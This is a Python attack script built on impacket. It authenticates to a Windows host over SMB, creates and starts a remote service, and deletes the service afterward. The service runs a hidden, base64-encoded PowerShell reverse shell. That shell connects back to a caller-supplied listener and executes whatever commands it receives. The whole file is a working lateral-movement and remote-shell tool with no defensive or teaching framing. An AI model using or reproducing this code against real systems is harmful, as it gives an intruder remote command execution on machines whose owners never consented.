import sys
import os
import argparse
import base64
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import SMBConnection

def connect_rpc(target, username, password, domain):
    """Establishes an RPC connection using SMB"""
    try:
        smb_conn = SMBConnection(target, target)
        smb_conn.login(username, password, domain)
        print(f"[*] Successfully authenticated with {domain}\\{username}")
        
        rpctransport = transport.SMBTransport(target, 445, r'\svcctl', smb_connection=smb_conn)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)
        return dce, rpctransport
    except Exception as e:
        print(f"[!] RPC connection failed: {e}")
        sys.exit(1)

def create_service(dce, service_name, binary_path):
    """Creates a Windows service remotely"""
    try:
        print("[*] Opening SC Manager...")
        scmr_handle = scmr.hROpenSCManagerW(dce)['lpScHandle']
        
        print("[*] Creating service:", service_name)
        resp = scmr.hRCreateServiceW(
            dce,
            scmr_handle,
            service_name,
            service_name,
            lpBinaryPathName=binary_path,
            dwStartType=scmr.SERVICE_DEMAND_START,
            dwServiceType=scmr.SERVICE_WIN32_OWN_PROCESS,
            dwErrorControl=scmr.SERVICE_ERROR_IGNORE,
            lpLoadOrderGroup=NULL,
            lpdwTagId=NULL,
            lpDependencies=NULL,
            lpServiceStartName=NULL,
            lpPassword=NULL
        )
        service_handle = resp['lpServiceHandle']
        
        print(f"[*] Service '{service_name}' created successfully")
        return scmr_handle, service_handle
    except Exception as e:
        print(f"[!] Error creating service: {e}")
        sys.exit(1)

def start_service(dce, service_handle):
    """Starts the created service"""
    try:
        print("[*] Starting service...")
        scmr.hRStartServiceW(dce, service_handle)
        print("[*] Service started successfully")
    except Exception as e:
        print(f"[!] Error starting service: {e}")
        # Continue execution, as sometimes the service starts despite the error

def delete_service(dce, service_handle):
    """Deletes the service after execution"""
    try:
        print("[*] Deleting service...")
        scmr.hRDeleteService(dce, service_handle)
        print("[*] Service deleted successfully")
    except Exception as e:
        print(f"[!] Error deleting service: {e}")

def close_handles(dce, scmr_handle, service_handle):
    """Closes the open service handles"""
    try:
        scmr.hRCloseServiceHandle(dce, service_handle)
        scmr.hRCloseServiceHandle(dce, scmr_handle)
    except Exception as e:
        print(f"[!] Error closing handles: {e}")

def main():
    parser = argparse.ArgumentParser(description="Remote Service Creation via SMB/RPC")
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("credentials", help="Username and password (format: domain\\username:password)")
    parser.add_argument("-i", "--lhost", required=True, help="Local host for callback")
    parser.add_argument("-p", "--lport", required=True, help="Local port for callback")
    parser.add_argument("-s", "--service-name", default="RemoteShell", help="Service name to create")
    
    args = parser.parse_args()
    
    # Parse credentials
    try:
        domain_user, password = args.credentials.split(":", 1)  # Use maxsplit=1 to handle passwords with colons
        domain, username = domain_user.split("\\", 1)  # Use maxsplit=1 to handle usernames with backslashes
    except ValueError:
        print("[!] Invalid credential format. Use domain\\username:password")
        sys.exit(1)
    
    target = args.target
    lhost = args.lhost
    lport = args.lport
    service_name = f"{args.service_name}_{os.urandom(2).hex()}"  # Add randomness to avoid conflicts
    
    # Create PowerShell reverse shell command
    powershell_command = f'''
$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''.encode('utf-16le')
    
    encoded_command = base64.b64encode(powershell_command).decode()
    binary_path = f"C:\\Windows\\System32\\cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded_command}"
    
    print(f"[*] Target: {target}")
    print(f"[*] Domain: {domain}")
    print(f"[*] Username: {username}")
    print(f"[*] Password: {'*' * len(password)}")
    print(f"[*] Local host: {lhost}")
    print(f"[*] Local port: {lport}")
    print(f"[*] Service name: {service_name}")
    
    # Connect to RPC service
    dce, rpctransport = connect_rpc(target, username, password, domain)
    
    # Create and start service
    scmr_handle, service_handle = create_service(dce, service_name, binary_path)
    
    try:
        # Start the service to execute our payload
        start_service(dce, service_handle)
        
        print("[*] Payload should be executed. Check your listener.")
        input("[*] Press Enter to cleanup service...")
    
    finally:
        # Cleanup
        delete_service(dce, service_handle)
        close_handles(dce, scmr_handle, service_handle)
        print("[*] Done.")

if __name__ == "__main__":
    main()
